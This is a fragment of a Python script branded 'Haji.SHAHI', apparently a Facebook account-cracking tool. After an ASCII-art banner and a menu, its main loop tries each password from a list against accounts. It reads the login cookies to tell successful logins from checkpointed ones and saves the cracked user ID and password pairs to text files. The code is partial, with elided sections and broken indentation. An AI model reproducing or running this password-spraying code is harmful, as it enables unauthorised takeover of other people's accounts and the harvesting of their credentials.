...
logo=("""
  ...
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
      ...
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
        "*$bd$$$$      '*$$$$$$$$$$$o+#"
             """"          """""""
  88888  dP"Yb  88  dP 888888 88""Yb 
    88 dP   Yb 88odP  88__   88__dP 
o.  88 Yb   dP 88"Yb  88""   88"Yb  
"bodP'  YbodP  88  Yb 888888 88  Yb   
...
→   Github     :  Haji.SHAHI
→   Tool Type  :  \x1b[1;95mHaji.SHAHI
\x1b[1;97m→   Version    :  Haji.SHAHI
\33[1;37m----------------------------------------------""")
...
def riaz():
	...
	if riaz1 =='4':
		os.system('xdg-open https://youtube.com/channel/UCEvniQzw5VfxGdpTT4RUf3A');riaz()
	if riaz1 =='2':
		bangla()
	else:
    ...
    try:
        for ps in pwx:
            ...
            if 'u_user' in log_cookies:
                ...
                uid = coki[151:166]
                print('\033[1;32m[Haji.SHAHI-OK] '+uid+'|'+ps+'\033[0;97m')
                open('Haji.SHAHI-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[141:152]
                print('\033[1;31m[Haji.SHAHI-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('Haji.SHAHI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mHaji.SHAHI\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
